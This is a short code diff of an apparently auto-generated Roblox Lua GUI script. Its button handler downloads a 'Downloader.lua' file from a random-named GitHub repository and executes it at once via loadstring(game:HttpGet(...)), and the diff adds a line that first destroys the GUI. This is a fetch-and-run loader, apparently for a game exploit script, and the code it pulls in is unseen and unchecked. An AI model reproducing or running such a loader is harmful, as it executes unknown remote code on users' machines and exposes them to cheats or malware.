@@ -1928,6 +1928,7 @@ local function DLXQDY_fake_script() -- Frame2.LocalScript
 
 	local Button = script.Parent.TextButton
 	Button.MouseButton1Click:Connect(function()
+		script.Parent:Destroy()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
 	end)
 end
